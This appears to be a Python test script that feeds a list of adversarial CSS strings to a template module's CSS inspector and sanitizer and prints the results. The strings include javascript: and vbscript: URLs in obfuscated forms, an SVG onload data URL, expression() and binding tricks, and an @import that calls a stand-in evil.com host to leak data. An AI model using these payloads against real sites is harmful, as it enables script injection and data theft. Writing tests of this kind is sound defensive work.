import sys
sys.path.insert(0, 'backend')

from app.modules.templates.security import (
    validate_css_property,
    sanitize_inline_css,
    TemplateSecurityInspector
)

attacks = {
    "mixed_case_protocol": "background: url(jAvAsCrIpT:alert(1))",
    "vbscript_protocol": "background: url(vBsCrIpT:msgbox(1))",
    "css_escape_protocol": r"background: url(\6a\61\76\61\73\63\72\69\70\74\3aalert(1))",
    "css_backslash": r"color: r\ed",
    "malformed_url": "background: url('javascript:alert(1)')",
    "http_url": "background: url(http://insecure.com/evil.png)",
    "data_url": "background: url('data:image/svg+xml;utf8,<svg onload=alert(1)>')",
    "css_comment_bypass": "color: /* comment */ red; evil: true",
    "css_custom_props": "color: var(--dangerous-color)",
    "semicolon_injection": "width: 10px; position: fixed; top: 0",
    "control_characters": "color: red\x00; z-index: 10",
    "expression": "width: expression(document.body.appendChild(1))",
    "behavior": "behavior: url(script.htc)",
    "moz_binding": "-moz-binding: url(xbl.xml#test)",
    "import_rule": "@import url('http://evil.com/leak.css')",
    "disallowed_property": "position: absolute; z-index: 9999; cursor: pointer"
}

print("=== TESTING ADVERSARIAL ATTACKS ===")
for name, attack in attacks.items():
    # Test via inspect_css
    findings = TemplateSecurityInspector.inspect_css(attack, context="test")
    # Test via sanitize_inline_css
    sanitized = sanitize_inline_css(attack)
    print(f"[{name}]")
    print(f"  Raw:       {attack}")
    print(f"  Findings:  {findings}")
    print(f"  Sanitized: {sanitized}")
    print()
